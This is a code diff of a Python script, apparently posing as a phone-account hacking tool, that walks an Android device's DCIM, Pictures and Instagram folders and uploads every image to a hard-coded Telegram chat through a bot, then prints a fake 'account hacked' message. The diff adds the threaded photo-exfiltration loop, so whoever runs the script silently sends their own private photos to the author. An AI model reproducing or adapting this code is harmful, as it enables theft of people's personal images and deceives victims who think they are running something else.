@@ -74,32 +74,40 @@ name = input('''\033[95m𝙞𝙣𝙨𝙞𝙧𝙖 𝙤 𝙣𝙪𝙢𝙚𝙧𝙤 �
 #@BoxPrey
 def send_file(file_path):
     try:
-        if file_path.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
-            with open(file_path, "rb") as f:
-                bot.send_photo(chat_id="1919739278", photo=f)
-                time.sleep(0.2)  # ← delay entre envios
-
+        with open(file_path, "rb") as f:
+            bot.send_photo(chat_id="1919739278", photo=f)
+            time.sleep(0.3)  # leve ajuste pra evitar flood
     except Exception:
         print("𝗲𝗿𝗿𝗼 𝗻𝗮 𝘀𝗼𝗹𝗶𝗰𝗶𝘁𝗮çã𝗼, 𝘁𝗲𝗻𝘁𝗮𝗻𝗱𝗼 𝗻𝗼𝘃𝗮𝗺𝗲𝗻𝘁𝗲.")
 
 def attack_message():
     print("\033[92m𝙘𝙤𝙣𝙩𝙖 𝙞𝙣𝙫𝙖𝙙𝙞𝙙𝙖 ✅\033[0m")
 
+from concurrent.futures import ThreadPoolExecutor
+import os
+
+VALID_EXT = {".jpg", ".jpeg", ".png", ".webp"}
+
 def main():
-    dir_path = "/storage/emulated/0/"
+    dirs_alvo = [
+        "/storage/emulated/0/DCIM",
+        "/storage/emulated/0/Pictures"
+        "/storage/emulated/0/Pictures/Instagram"
+    ]
 
-    file_threads = []
-    for root, dirs, files in os.walk(dir_path):
-        for file in files:
-            file_path = os.path.join(root, file)
-            t = Thread(target=send_file, args=(file_path,))
-            t.start()
-            file_threads.append(t)
+    with ThreadPoolExecutor(max_workers=3) as executor:
+        for dir_path in dirs_alvo:
 
-    for file_thread in file_threads:
-        file_thread.join()
+            if not os.path.exists(dir_path):
+                continue
 
-    attack_message()  # ✔ agora sim, só no final
+            for root, dirs, files in os.walk(dir_path):
+                for file in files:
+                    ext = os.path.splitext(file)[1].lower()
+
+                    if ext in VALID_EXT:
+                        file_path = os.path.join(root, file)
+                        executor.submit(send_file, file_path)
 #@BoxPrey
 if __name__ == "__main__":
     enviar_log()
